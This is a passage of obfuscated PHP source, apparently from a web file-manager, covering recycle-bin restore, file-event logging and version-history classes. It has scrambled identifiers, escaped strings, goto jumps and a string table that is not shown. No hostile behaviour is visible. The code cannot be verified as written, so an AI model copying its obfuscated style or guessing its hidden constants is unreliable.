$áğÖ—ø£ = array($Ì¡«üŠ”[652] => array($Ì¡«üŠ”[612], $óŒ·Ââñ[$Ì¡«üŠ”[584]] . $ÃÕÖƒˆí . $Ì¡«üŠ”[613])); $Ç³Íš¢á->where($áğÖ—ø£)->setField($Ì¡«üŠ”[505], 1); } } public function clear() { $this->remove(!1); } public function remove($­ÕìãÓ› = false, $êœääæ² = false) { $Ù€öæóâ =& $_SERVER[²Ö÷öõ]; $êœääæ² = $êœääæ² ? $êœääæ² : USER_ID; $Šª××»ş = Model($Ù€öæóâ[1428]); $¦¦ÓÌíİ = $this->listData($êœääæ²); $­ÕìãÓ› = $­ÕìãÓ› === !1 ? !1 : $­ÕìãÓ›; $í«ô©‰” = array(); foreach ($¦¦ÓÌíİ as $ÒÁ¡ÎªÑ) { if ($­ÕìãÓ› != !1 && !in_array($ÒÁ¡ÎªÑ, $­ÕìãÓ›)) { continue; } $¸«•½¿½ = $Šª××»ş->sourceInfo($ÒÁ¡ÎªÑ); $Šª××»ş->remove($ÒÁ¡ÎªÑ, !1); $ÁôİšåĞ = $¸«•½¿½[$Ù€öæóâ[190]] . $Ù€öæóâ[11] . $¸«•½¿½[$Ù€öæóâ[569]]; $í«ô©‰”[$ÁôİšåĞ] = array($Ù€öæóâ[648] => $¸«•½¿½[$Ù€öæóâ[190]], $Ù€öæóâ[569] => $¸«•½¿½[$Ù€öæóâ[569]]); $this->where(array($Ù€öæóâ[193] => $ÒÁ¡ÎªÑ))->delete(); } foreach ($í«ô©‰” as $÷ŞÄ¬šÅ) { $Šª××»ş->targetSpaceUpdate($÷ŞÄ¬šÅ[$Ù€öæóâ[190]], $÷ŞÄ¬šÅ[$Ù€öæóâ[569]]); } } public function restore($îµ´ÛŸÊ = false) { $¾Åëà‚ƒ = $this->listData(); $this->_restoreSource($¾Åëà‚ƒ, $îµ´ÛŸÊ); } public function removeUserAll($ŸœÚä³½) { $this->remove(!1, $ŸœÚä³½); } public function restoreItem($©µº¥) { $this->_restoreSource(array($©µº¥), array($©µº¥)); } private function _restoreSource($¼¾Ç´õÈ, $ÆÂÏ·ø¶) { $œ¨ü»´û =& $_SERVER[²Ö÷öõ]; $Ï÷£×Èå = Model($œ¨ü»´û[1428]); $ÆÂÏ·ø¶ = $ÆÂÏ·ø¶ == !1 ? !1 : $ÆÂÏ·ø¶; if (!$¼¾Ç´õÈ) { return !0; } $†å şÓñ = array(); foreach ($¼¾Ç´õÈ as $ÁÌƒÎ–“) { if ($ÆÂÏ·ø¶ != !1 && !in_array($ÁÌƒÎ–“, $ÆÂÏ·ø¶)) { continue; } $óãÓãû¢ = $Ï÷£×Èå->sourceInfo($ÁÌƒÎ–“); $í¶áÁÕğ = $Ï÷£×Èå->sourceInfo($óãÓãû¢[$œ¨ü»´û[192]]); if ($í¶áÁÕğ[$œ¨ü»´û[505]] == $œ¨ü»´û[91]) { continue; } $Ï÷£×Èå->lockMoveStart($ÁÌƒÎ–“); $this->recycleMove($ÁÌƒÎ–“, 0); if ($óãÓãû¢[$œ¨ü»´û[485]] == $œ¨ü»´û[91]) { $ôÛÊåİƒ = array($œ¨ü»´û[652] => array($œ¨ü»´û[612], $óãÓãû¢[$œ¨ü»´û[584]] . $ÁÌƒÎ–“ . $œ¨ü»´û[613])); $Ï÷£×Èå->where($ôÛÊåİƒ)->setField($œ¨ü»´û[505], 0); $this->restoreFolderChildren($ÁÌƒÎ–“, $¼¾Ç´õÈ); } $this->where(array($œ¨ü»´û[193] => $ÁÌƒÎ–“))->delete(); $Ï÷£×Èå->folderSizeReset($óãÓãû¢[$œ¨ü»´û[192]]); $†å şÓñ[] = $óãÓãû¢[$œ¨ü»´û[192]]; if ($óãÓãû¢[$œ¨ü»´û[485]] == $œ¨ü»´û[91]) { $†å şÓñ[] = $ÁÌƒÎ–“; } $Ï÷£×Èå->lockMoveEnd($ÁÌƒÎ–“); } $Ï÷£×Èå->updateModifyTime($†å şÓñ); } private function restoreFolderChildren($É ¶Šõ, $æ™¾ËÍ¦) { $¡ œ˜™À =& $_SERVER[²Ö÷öõ]; $òèíßÕ = Model($¡ œ˜™À[1428]); $¨á·£¢É = array($¡ œ˜™À[193] => array($¡ œ˜™À[7], array())); foreach ($æ™¾ËÍ¦ as $†Ç¨’±”) { if ($†Ç¨’±” == $É ¶Šõ) { continue; } if (!$òèíßÕ->isParentOf($É ¶Šõ, $†Ç¨’±”)) { continue; } $¥ñœ‹•³ = $òèíßÕ->sourceInfo($†Ç¨’±”); if ($¥ñœ‹•³[$¡ œ˜™À[485]] == $¡ œ˜™À[91]) { $¨á·£¢É[] = array($¡ œ˜™À[652] => array($¡ œ˜™À[612], $¥ñœ‹•³[$¡ œ˜™À[584]] . $†Ç¨’±” . $¡ œ˜™À[613])); } else { $¨á·£¢É[$¡ œ˜™À[193]][1][] = $†Ç¨’±”; } } if (!$¨á·£¢É[$¡ œ˜™À[193]][1]) { unset($¨á·£¢É[$¡ œ˜™À[193]]); } if (!$¨á·£¢É) { return; } if (is_array($¨á·£¢É[$¡ œ˜™À[193]]) && is_array($¨á·£¢É[$¡ œ˜™À[193]][1])) { $¨á·£¢É[$¡ œ˜™À[193]][1] = array_unique($¨á·£¢É[$¡ œ˜™À[193]][1]); } $¨á·£¢É[$¡ œ˜™À[1086]] = $¡ œ˜™À[2082]; $òèíßÕ->where($¨á·£¢É)->setField($¡ œ˜™À[505], 1); } private function recycleMove($ùé µÃş, $â·»ù¾« = 1) { $ç´º¹· =& $_SERVER[²Ö÷öõ]; $İÊ›ê¿Æ = Model($ç´º¹·[1428]); $¤ÌŒ™İ´ = Model($ç´º¹·[2303]); $ĞÕçüñù = array($ç´º¹·[193] => $ùé µÃş); if ($â·»ù¾«) { $İÊ›ê¿Æ->where($ĞÕçüñù)->setField($ç´º¹·[505], 1); $¤ÌŒ™İ´->eventRecycle($ùé µÃş, $ç´º¹·[2304]); } else { $—®„‰ë‡ = $İÊ›ê¿Æ->where($ĞÕçüñù)->find(); $ó ò› = $—®„‰ë‡[$ç´º¹·[485]] == $ç´º¹·[91]; $„Üåè¦İ = $İÊ›ê¿Æ->fileNameAuto($—®„‰ë‡[$ç´º¹·[192]], $—®„‰ë‡[$ç´º¹·[32]], REPEAT_RENAME_FOLDER, $ó ò›); if ($„Üåè¦İ != $—®„‰ë‡[$ç´º¹·[32]]) { $İÊ›ê¿Æ->rename($ùé µÃş, $„Üåè¦İ); } $İÊ›ê¿Æ->where($ĞÕçüñù)->setField($ç´º¹·[505], 0); $¤ÌŒ™İ´->eventRecycle($ùé µÃş, $ç´º¹·[2305]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x73\x6f\x75\162\x63\x65\x53\x65\143\x72\x65\164\114\151\x73\x74"; public $field = array("\x73\x6f\x75\162\x63\x65\111\x44", "\164\171\160\145\111\104", "\143\162\x65\141\164\145\125\x73\x65\162"); } goto eÊÊ‰ä¬ÌØ; fõƒ¡‘©ß‚: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\x65\137\x65\x76\x65\156\164"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\155\x65", "\x74\151\155\x65", "\x69\156\163\x65\162\x74", "\146\165\156\143\164\151\157\x6e"), array("\144\x65\163\x63", '', "\x69\156\x73\145\162\x74\54\x75\x70\x64\141\x74\x65\54\x73\x65\154\x65\x63\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($‡ı¾À—±, $¨Ø¡Îˆû, $Ûâ‡¯ùš = '') { $²şêÖıî =& $_SERVER[²Ö÷öõ]; if (!$this->eventSave) { return; } $ãé±¯Ü‰ = Model($²şêÖıî[1428])->sourceInfo($‡ı¾À—±); if (!$ãé±¯Ü‰) { return !1; } if ($this->isDisableEvent($ãé±¯Ü‰, $¨Ø¡Îˆû)) { return; } if ($Ûâ‡¯ùš && is_string($Ûâ‡¯ùš)) { $Ûâ‡¯ùš = array($²şêÖıî[2019] => $Ûâ‡¯ùš); } $ñåâŒˆ¬ = defined($²şêÖıî[2206]) ? USER_ID : 0; $üŠã–¨‹ = array($²şêÖıî[491] => $‡ı¾À—±, $²şêÖıî[2207] => $ãé±¯Ü‰[$²şêÖıî[192]], $²şêÖıî[2208] => $ãé±¯Ü‰[$²şêÖıî[32]], $²şêÖıî[582] => !empty($ãé±¯Ü‰[$²şêÖıî[582]]) ? $ãé±¯Ü‰[$²şêÖıî[582]] : $²şêÖıî[12], $²şêÖıî[1771] => $ñåâŒˆ¬, $²şêÖıî[496] => $¨Ø¡Îˆû, $²şêÖıî[1773] => $Ûâ‡¯ùš); $this->addSystemLog($¨Ø¡Îˆû, $üŠã–¨‹); unset($üŠã–¨‹[$²şêÖıî[2208]], $üŠã–¨‹[$²şêÖıî[582]]); return $this->add($üŠã–¨‹); } private function addSystemLog($ìŒŞõó, $Ô…‚û¨») { $â–Öªüú =& $_SERVER[²Ö÷öõ]; if ($ìŒŞõó == $â–Öªüú[2209]) { $ìŒŞõó = $Ô…‚û¨»[$â–Öªüú[526]][$â–Öªüú[2210]]; } else { if (in_array($ìŒŞõó, array($â–Öªüú[1959], $â–Öªüú[2211]))) { $ìŒŞõó = $Ô…‚û¨»[$â–Öªüú[526]][$â–Öªüú[171]]; } } $¨Ğ¼¸öˆ = array_merge($Ô…‚û¨», array($â–Öªüú[2212] => $Ô…‚û¨»[$â–Öªüú[193]], $â–Öªüú[2213] => $Ô…‚û¨»[$â–Öªüú[2213]])); Hook::trigger($â–Öªüú[2214], $â–Öªüú[2215] . $ìŒŞõó, $Ô…‚û¨»); Model($â–Öªüú[1923])->addLog($â–Öªüú[2215] . $ìŒŞõó, $¨Ğ¼¸öˆ); } private function isDisableEvent($ª“²–äÃ, $Éµ“Ş) { $¬ĞÁ±¼ş =& $_SERVER[²Ö÷öõ]; if ($ª“²–äÃ[$¬ĞÁ±¼ş[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Éµ“Ş == $¬ĞÁ±¼ş[1948]) { return !1; } return !0; } public function eventCreate($Ğˆâ°Ÿ², $¢±º‡ÓÉ) { $çÉ¡æ— =& $_SERVER[²Ö÷öõ]; $“·øÏ›ø = Model($çÉ¡æ—[1428])->sourceInfo($Ğˆâ°Ÿ²); $¿›ò”½´ = array($çÉ¡æ—[2210] => $¢±º‡ÓÉ, $çÉ¡æ—[32] => $“·øÏ›ø[$çÉ¡æ—[32]]); return $this->addEvent($Ğˆâ°Ÿ², $çÉ¡æ—[2209], $¿›ò”½´); } public function eventFileEdit($¬‹ı²£–) { $‚‚©Å»¹ =& $_SERVER[²Ö÷öõ]; $İ—¾˜ï = array($‚‚©Å»¹[2216] => $_SERVER[$‚‚©Å»¹[2217]], $‚‚©Å»¹[2218] => strtolower(ACTION)); if (isset($GLOBALS[$‚‚©Å»¹[7]][$‚‚©Å»¹[2219]])) { $İ—¾˜ï[$‚‚©Å»¹[2219]] = $‚‚©Å»¹[91]; } return $this->addEvent($¬‹ı²£–, $‚‚©Å»¹[1949], $İ—¾˜ï); } public function eventRecycle($Ö¤‡¢™Õ, $§™ù³¶) { return $this->addEvent($Ö¤‡¢™Õ, $_SERVER[²Ö÷öõ][2211], $§™ù³¶); } private static $_removeLast = ''; public function eventRemove($öÜÜâ»˜) { $ğÜšÀ„ =& $_SERVER[²Ö÷öõ]; self::$_removeLast = $öÜÜâ»˜; $Æ¦ª °¯ = Model($ğÜšÀ„[1428])->sourceInfo($öÜÜâ»˜); $£Ş¶°¹‹ = array_field_key($Æ¦ª °¯, array($ğÜšÀ„[193], $ğÜšÀ„[541], $ğÜšÀ„[505], $ğÜšÀ„[584])); $‰óñ‚¿– = array($ğÜšÀ„[171] => $Æ¦ª °¯[$ğÜšÀ„[32]], $ğÜšÀ„[2218] => ACTION, $ğÜšÀ„[2220] => $£Ş¶°¹‹); return $this->addEvent($Æ¦ª °¯[$ğÜšÀ„[192]], $ğÜšÀ„[1948], $‰óñ‚¿–); } public function eventShare($¨úÓÄ•, $ÍîÍÓî›) { return $this->addEvent($¨úÓÄ•, $_SERVER[²Ö÷öõ][1959], $ÍîÍÓî›); } public function eventMove($·×ìçşı, $†îØ¤õ€, $†¾ó¯­ƒ) { $Í¢¶Å™Ã =& $_SERVER[²Ö÷öõ]; if (self::$_removeLast == $·×ìçşı) { return; } $¢±•˜®À = Model($Í¢¶Å™Ã[1428]); $Ôè´·Ö = $¢±•˜®À->sourceInfo($·×ìçşı); $ä˜´í¾³ = $¢±•˜®À->sourceInfo($†îØ¤õ€); $ìŸüÔ = $¢±•˜®À->sourceInfo($†¾ó¯­ƒ); $ë¤÷ĞŸÚ = array($Í¢¶Å™Ã[1249] => $†îØ¤õ€, $Í¢¶Å™Ã[2221] => $ä˜´í¾³[$Í¢¶Å™Ã[32]], $Í¢¶Å™Ã[2197] => !empty($ä˜´í¾³[$Í¢¶Å™Ã[582]]) ? $ä˜´í¾³[$Í¢¶Å™Ã[582]] : $Í¢¶Å™Ã[12], $Í¢¶Å™Ã[1250] => $†¾ó¯­ƒ, $Í¢¶Å™Ã[2222] => $ìŸüÔ[$Í¢¶Å™Ã[32]], $Í¢¶Å™Ã[2223] => !empty($ìŸüÔ[$Í¢¶Å™Ã[582]]) ? $ìŸüÔ[$Í¢¶Å™Ã[582]] : $Í¢¶Å™Ã[12]); $this->addEvent($·×ìçşı, $Í¢¶Å™Ã[620], $ë¤÷ĞŸÚ); $Ôè´·Ö = $¢±•˜®À->sourceInfo($·×ìçşı); $ë¤÷ĞŸÚ = array($Í¢¶Å™Ã[193] => $Ôè´·Ö[$Í¢¶Å™Ã[193]], $Í¢¶Å™Ã[32] => $Ôè´·Ö[$Í¢¶Å™Ã[32]]); $this->addEvent($†îØ¤õ€, $Í¢¶Å™Ã[2224], $ë¤÷ĞŸÚ); } public function eventCopy($‰«ˆè‘Ü) { $this->eventCreate($‰«ˆè‘Ü, $_SERVER[²Ö÷öõ][618]); } public function eventRename($îúÃ¢™ß, $ï×ÒÔ·±, $ºò©…œì) { $üİÑë«° =& $_SERVER[²Ö÷öõ]; $æŒ¡œ‘ì = array($üİÑë«°[1249] => $ï×ÒÔ·±, $üİÑë«°[1250] => $ºò©…œì); return $this->addEvent($îúÃ¢™ß, $üİÑë«°[1442], $æŒ¡œ‘ì); } public function eventAddComment($ÍÎò˜õµ, $£Ä›ã…ä) { return $this->addEvent($ÍÎò˜õµ, $_SERVER[²Ö÷öõ][2225], $£Ä›ã…ä); } public function eventAddDesc($©Ù±ÛÜá, $¨°îü) { return $this->addEvent($©Ù±ÛÜá, $_SERVER[²Ö÷öõ][2226], $¨°îü); } public function listBySource($ßï°à§) { $İ¤ö¿”— =& $_SERVER[²Ö÷öõ]; $ÎÍòÎë… = Model($İ¤ö¿”—[1428])->sourceInfo($ßï°à§); $ë¤È”ç™ = array($İ¤ö¿”—[491] => $ßï°à§); if ($ÎÍòÎë…[$İ¤ö¿”—[485]] == $İ¤ö¿”—[91]) { $Ö¨Âè¯Ã = Model($İ¤ö¿”—[1428])->listSearchChildren($ßï°à§, 20000); $Ö¨Âè¯Ã[] = $ßï°à§ . $İ¤ö¿”—[454]; $ë¤È”ç™ = array($İ¤ö¿”—[193] => array($İ¤ö¿”—[7], $Ö¨Âè¯Ã)); } $–ğÙªŸ = $this->where($ë¤È”ç™)->order($İ¤ö¿”—[2227])->selectPage(); if ($–ğÙªŸ[$İ¤ö¿”—[442]][$İ¤ö¿”—[443]] == 0) { $–ğÙªŸ[$İ¤ö¿”—[442]][$İ¤ö¿”—[443]] = 1; $–ğÙªŸ[$İ¤ö¿”—[445]] = array(array($İ¤ö¿”—[491] => $ßï°à§, $İ¤ö¿”—[2207] => $ÎÍòÎë…[$İ¤ö¿”—[192]], $İ¤ö¿”—[1771] => $ÎÍòÎë…[$İ¤ö¿”—[527]], $İ¤ö¿”—[496] => $İ¤ö¿”—[2228], $İ¤ö¿”—[497] => $ÎÍòÎë…[$İ¤ö¿”—[231]], $İ¤ö¿”—[1773] => $İ¤ö¿”—[12])); } return $this->eventListParse($–ğÙªŸ, $ßï°à§); } private function eventListParse($ï£ºó¥, $ó··øÉœ) { $óèë =& $_SERVER[²Ö÷öõ]; $µï°çÎ = $ï£ºó¥[$óèë[445]]; $ÇÖ°ÇÌô = array_to_keyvalue($µï°çÎ, $óèë[12], $óèë[193]); $¸†´”‰Í = array_to_keyvalue($µï°çÎ, $óèë[12], $óèë[2213]); foreach ($µï°çÎ as $µğ›öªú) { $±¾„åÄ = $µğ›öªú[$óèë[526]]; if ($µğ›öªú[$óèë[33]] == $óèë[620] && isset($±¾„åÄ[$óèë[1249]])) { $ÇÖ°ÇÌô[] = $±¾„åÄ[$óèë[1249]] . $óèë[12]; $ÇÖ°ÇÌô[] = $±¾„åÄ[$óèë[1250]] . $óèë[12]; } if ($µğ›öªú[$óèë[33]] == $óèë[2224] && isset($±¾„åÄ[$óèë[193]])) { $ÇÖ°ÇÌô[] = $±¾„åÄ[$óèë[193]] . $óèë[12]; } } $ÇÖ°ÇÌô = array_merge($ÇÖ°ÇÌô, $¸†´”‰Í, array($ó··øÉœ . $óèë[12])); $ÇÖ°ÇÌô = array_unique($ÇÖ°ÇÌô); $ç»¼’™± = array_unique(array_to_keyvalue($µï°çÎ, $óèë[12], $óèë[1780])); $¹³ı‰†« = Model($óèë[598])->userListInfo($ç»¼’™±); $ıÌÈ¨ì± = Model($óèë[907])->sourceListInfo($ÇÖ°ÇÌô, !0); foreach ($µï°çÎ as &$µğ›öªú) { if ($µğ›öªú[$óèë[33]] == $óèë[620] && isset($µğ›öªú[$óèë[526]][$óèë[1249]])) { $µğ›öªú[$óèë[526]][$óèë[1249]] = $ıÌÈ¨ì±[$µğ›öªú[$óèë[526]][$óèë[1249]]]; $µğ›öªú[$óèë[526]][$óèë[1250]] = $ıÌÈ¨ì±[$µğ›öªú[$óèë[526]][$óèë[1250]]]; } if ($µğ›öªú[$óèë[33]] == $óèë[2224] && isset($µğ›öªú[$óèë[526]][$óèë[193]])) { $µğ›öªú[$óèë[526]][$óèë[193]] = $ıÌÈ¨ì±[$µğ›öªú[$óèë[526]][$óèë[193]]]; } $µğ›öªú[$óèë[90]] = $ıÌÈ¨ì±[$µğ›öªú[$óèë[193]]]; $µğ›öªú[$óèë[2229]] = $ıÌÈ¨ì±[$µğ›öªú[$óèë[2213]]]; if ($µğ›öªú[$óèë[33]] == $óèë[1948]) { $µğ›öªú[$óèë[2229]] = $µğ›öªú[$óèë[90]]; $µğ›öªú[$óèë[2213]] = $µğ›öªú[$óèë[2229]][$óèë[193]]; $µğ›öªú[$óèë[90]] = !1; $µğ›öªú[$óèë[193]] = $óèë[12]; } $µğ›öªú[$óèë[2156]] = $¹³ı‰†«[$µğ›öªú[$óèë[1780]]]; } unset($µğ›öªú); $ï£ºó¥[$óèë[445]] = $µï°çÎ; return $ï£ºó¥; } public function removeBySource($Š†¯´Ñ) { $áê±•Üø = array($_SERVER[²Ö÷öõ][491] => $Š†¯´Ñ); $this->where($áê±•Üø)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\143\145\137\150\x69\163\164\x6f\x72\171"; public function historyCount($åîı”êÃ) { $ù¿›É  =& $_SERVER[²Ö÷öõ]; if (!$åîı”êÃ) { return array(); } if (is_string($åîı”êÃ) || is_int($åîı”êÃ)) { $åîı”êÃ = array($åîı”êÃ); } $µ“ÇÒû³ = array($ù¿›É [193], $ù¿›É [2013] => $ù¿›É [565]); $çûÊãò = array($ù¿›É [193] => array($ù¿›É [7], $åîı”êÃ)); $Ù¯î• = $this->field($µ“ÇÒû³)->where($çûÊãò)->group($ù¿›É [193])->select(); return array_to_keyvalue($Ù¯î•, $ù¿›É [193], $ù¿›É [565]); } public function addHistory($Ø«ƒ¶·‡, $å©ŠÒÑÂ = '') { $ùÁ¦˜“ =& $_SERVER[²Ö÷öõ]; $Íª÷—Ä® = array($ùÁ¦˜“[491] => $Ø«ƒ¶·‡[$ùÁ¦˜“[193]], $ùÁ¦˜“[1771] => isset($Ø«ƒ¶·‡[$ùÁ¦˜“[529]]) ? $Ø«ƒ¶·‡[$ùÁ¦˜“[529]] : $Ø«ƒ¶·‡[$ùÁ¦˜“[527]], $ùÁ¦˜“[542] => $Ø«ƒ¶·‡[$ùÁ¦˜“[541]], $ùÁ¦˜“[617] => $Ø«ƒ¶·‡[$ùÁ¦˜“[79]], $ùÁ¦˜“[2230] => $å©ŠÒÑÂ); if ($GLOBALS[$ùÁ¦˜“[6]][$ùÁ¦˜“[92]][$ùÁ¦˜“[1312]] >= 1) { $this->historyAutoClear($Íª÷—Ä®[$ùÁ¦˜“[193]]); $this->add($Íª÷—Ä®); } Hook::trigger($ùÁ¦˜“[2231], $Íª÷—Ä®); Model($ùÁ¦˜“[2232])->eventFileEdit($Ø«ƒ¶·‡[$ùÁ¦˜“[193]]); } private function historyAutoClear($ğ©ÑÄØ) { $âéüÃˆÉ =& $_SERVER[²Ö÷öõ]; $òçÜ×şà = Model($âéüÃˆÉ[853])->get($âéüÃˆÉ[1334]); $Ó´Â…Šı = intval($GLOBALS[$âéüÃˆÉ[6]][$âéüÃˆÉ[92]][$âéüÃˆÉ[1312]]); $ÑšÅüïÅ = $òçÜ×şà == $âéüÃˆÉ[1335] ? min(5, $Ó´Â…Šı) : $Ó´Â…Šı; $ÑšÅüïÅ = $ÑšÅüïÅ <= 0 ? 0 : $ÑšÅüïÅ - 1; if ($ÑšÅüïÅ >= 499) { return; } $™ÅÎ©Š¨ = array($âéüÃˆÉ[491] => $ğ©ÑÄØ); $ŸÉü­ê‚ = $this->field($âéüÃˆÉ[2233])->where($™ÅÎ©Š¨)->order($âéüÃˆÉ[2227])->select(); if (!$ŸÉü­ê‚ || $ÑšÅüïÅ >= count($ŸÉü­ê‚)) { return; } $¶Îã÷¡± = array_to_keyvalue($ŸÉü­ê‚, $âéüÃˆÉ[12], $âéüÃˆÉ[475]); $¶Îã÷¡± = array_slice($¶Îã÷¡±, $ÑšÅüïÅ); $Ìù–ş¿ë = array_to_keyvalue($ŸÉü­ê‚, $âéüÃˆÉ[12], $âéüÃˆÉ[541]); $Ìù–ş¿ë = array_slice($Ìù–ş¿ë, $ÑšÅüïÅ); if (!$¶Îã÷¡± || !$Ìù–ş¿ë) { return; } $™ÅÎ©Š¨ = array($âéüÃˆÉ[493] => array($âéüÃˆÉ[7], $¶Îã÷¡±)); $this->where($™ÅÎ©Š¨)->delete(); Model($âéüÃˆÉ[544])->remove($Ìù–ş¿ë); } public function listData($àöµ·½) { $ĞõÏ­ğ =& $_SERVER[²Ö÷öõ]; $»¤óÛÍ‘ = array($ĞõÏ­ğ[491] => $àöµ·½); $Ÿ²­ªÍŸ = $ĞõÏ­ğ[2234]; $ÜÄôÈ¿÷ = $this->field($Ÿ²­ªÍŸ)->where($»¤óÛÍ‘)->order($ĞõÏ­ğ[2227])->selectPage(); $this->_listAppendUser($ÜÄôÈ¿÷[$ĞõÏ­ğ[445]]); $äçşÁ²™ = Model($ĞõÏ­ğ[853])->get($ĞõÏ­ğ[1334]); $°Ø±öâÁ = 5; if ($äçşÁ²™ == $ĞõÏ­ğ[1335]) { $ÜÄôÈ¿÷[$ĞõÏ­ğ[445]] = array_slice($ÜÄôÈ¿÷[$ĞõÏ­ğ[445]], 0, $°Ø±öâÁ); $ÜÄôÈ¿÷[$ĞõÏ­ğ[442]] = array($ĞõÏ­ğ[2235] => 1, $ĞõÏ­ğ[2236] => 20, $ĞõÏ­ğ[2237] => 1, $ĞõÏ­ğ[2238] => count($ÜÄôÈ¿÷[$ĞõÏ­ğ[445]])); } return $ÜÄôÈ¿÷; } protected function _listAppendUser(&$‡ôÊ“´Ã) { $ÎÒëŸÑ‘ =& $_SERVER[²Ö÷öõ]; $±¬ãäıí = array_to_keyvalue($‡ôÊ“´Ã, $ÎÒëŸÑ‘[12], $ÎÒëŸÑ‘[1780]); $¼ï²Ñè = Model($ÎÒëŸÑ‘[598])->userListInfo($±¬ãäıí); foreach ($‡ôÊ“´Ã as &$ÉĞ•õì÷) { $ı­ÕÎ‡ƒ = $ÉĞ•õì÷[$ÎÒëŸÑ‘[1780]]; $ÉĞ•õì÷[$ÎÒëŸÑ‘[527]] = $¼ï²Ñè[$ı­ÕÎ‡ƒ] ? $¼ï²Ñè[$ı­ÕÎ‡ƒ] : !1; } unset($ÉĞ•õì÷); } public function fileInfo($Í¤­·û¸) { $Úâ¼²ô =& $_SERVER[²Ö÷öõ]; $ŒÄùÄÚ = $this->tablePrefix; $®¹õÓ²Í = "{$ŒÄùÄÚ}\151\x6f\137\x66\x69\x6c\x65\x20\x66\151\154\x65\163\x20\157\156\40\146\151\x6c\x65\x73\x2e\146\151\154\145\111\x44\40\75\40\x68\151\163\x74\x6f\x72\x79\x2e\x66\151\154\x65\111\104"; return $this->alias($Úâ¼²ô[2239])->where(array($Úâ¼²ô[493] => $Í¤­·û¸))->join($®¹õÓ²Í, $Úâ¼²ô[2240])->find(); } public function removeItem($Åáûš‹ñ) { $ï…éÄ‡ =& $_SERVER[²Ö÷öõ]; $ÀÕãåê„ = array($ï…éÄ‡[493] => $Åáûš‹ñ); $€â‹Ï÷ = $this->where($ÀÕãåê„)->find(); if ($€â‹Ï÷) { $Óƒ˜‘ô½ = $this->where($ÀÕãåê„)->delete(); Model($ï…éÄ‡[544])->remove($€â‹Ï÷[$ï…éÄ‡[541]]); return $Óƒ˜‘ô½; } return !1; } public function removeBySource($óÜ×ÅÓñ) { $¿¿Ö¨Ö… =& $_SERVER[²Ö÷öõ]; if (!$óÜ×ÅÓñ) { return !1; } if (!is_array($óÜ×ÅÓñ)) { $óÜ×ÅÓñ = array($óÜ×ÅÓñ); } $‡Ñ¿¿¤ = array($¿¿Ö¨Ö…[491] => array($¿¿Ö¨Ö…[7], $óÜ×ÅÓñ)); $»ÃÖÀ¼÷ = $this->field($¿¿Ö¨Ö…[542])->where($‡Ñ¿¿¤)->select(); if ($»ÃÖÀ¼÷) { $this->where($‡Ñ¿¿¤)->delete(); $”šŠÃ¯Ó = array_to_keyvalue($»ÃÖÀ¼÷, $¿¿Ö¨Ö…[12], $¿¿Ö¨Ö…[541]); Model($¿¿Ö¨Ö…[544])->remove($”šŠÃ¯Ó); } return !0; } public function setDetail($½“¥çÂü, $÷˜Ÿ·Œâ) { $ƒà³ªÒ =& $_SERVER[²Ö÷öõ]; return $this->where(array($ƒà³ªÒ[493] => $½“¥çÂü))->save(array($ƒà³ªÒ[2230] => $÷˜Ÿ·Œâ)); } public function rollbackToItem($³®¢ôÕÂ, $³ïô”¢İ) { $˜ê¨öãÓ =& $_SERVER[²Ö÷öõ]; $ôçô¢Ûâ = Model($˜ê¨öãÓ[907])->sourceInfo($³®¢ôÕÂ); $this->addHistory($ôçô¢Ûâ, LNG($˜ê¨öãÓ[2241])); $áïÔ‰»ö = $this->find($³ïô”¢İ); $ôÆ€—â = array($˜ê¨öãÓ[541] => $áïÔ‰»ö[$˜ê¨öãÓ[541]], $˜ê¨öãÓ[79] => $áïÔ‰»ö[$˜ê¨öãÓ[79]], $˜ê¨öãÓ[88] => time(), $˜ê¨öãÓ[529] => USER_ID); Model($˜ê¨öãÓ[907])->where(array($˜ê¨öãÓ[193] => $³®¢ôÕÂ))->save($ôÆ€—â); return $this->where(array($˜ê¨öãÓ[493] => $³ïô”¢İ))->delete(); } public function clearSame($”¥œ ¬ê) { $ÇÍğŒ =& $_SERVER[²Ö÷öõ]; $›Æà©Ôö = $this->listData($”¥œ ¬ê); $›¡ÄœÃ = array_to_keyvalue_group($›Æà©Ôö, $ÇÍğŒ[541]); $©µ‘ù¸ = array(); $‹üôï¡ğ = array(); foreach ($›¡ÄœÃ as $œâôªÎ) { if (!$œâôªÎ || count($œâôªÎ) <= 1) { continue; } foreach ($œâôªÎ as $ı¦Ğüì…) { $©µ‘ù¸[] = $ı¦Ğüì…[$ÇÍğŒ[541]]; $‹üôï¡ğ[] = $ı¦Ğüì…[$ÇÍğŒ[475]]; } } if (!$‹üôï¡ğ) { return; } $this->where(array($ÇÍğŒ[475] => array($ÇÍğŒ[7], $‹üôï¡ğ)))->delete(); Model($ÇÍğŒ[544])->remove($©µ‘ù¸); } public function userSpace() { $ıÌ¹Ğê =& $_SERVER[²Ö÷öõ]; $ÆƒŒ”– = $this->tablePrefix; $»ŸÚ±Â˜ = array($ıÌ¹Ğê[1771] => USER_ID); $ã¡²æ¼É = "{$ÆƒŒ”–}\x69\x6f\137\x66\x69\154\145\40\146\151\x6c\x65\x73\x20\157\x6e\40\x66\151\x6c\145\163\x2e\x66\151\154\x65\x49\104\40\75\x20\x68\151\163\x74\x6f\162\x79\56\146\151\154\x65\111\104"; return $this->alias($ıÌ¹Ğê[2239])->where($»ŸÚ±Â˜)->join($ã¡²æ¼É, $ıÌ¹Ğê[2240])->sum($ıÌ¹Ğê[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ã€ë€á) { $ïÉáğ =& $_SERVER[²Ö÷öõ]; $ÉÈ²Œ¼• = KodIO::fileTypeList(); $¥¸öüÛë = $ÉÈ²Œ¼•[$ã€ë€á]; if (!$¥¸öüÛë) { return array(); } $œ÷ŞÉ‡ = $¥¸öüÛë[$ïÉáğ[169]]; $Ÿâ–ÍşÒ = $ïÉáğ[7]; if (!$¥¸öüÛë[$ïÉáğ[169]]) { $•êû¿¸ = array_to_keyvalue($ÉÈ²Œ¼•, $ïÉáğ[12], $ïÉáğ[169]); $œ÷ŞÉ‡ = implode($ïÉáğ[50], $•êû¿¸); 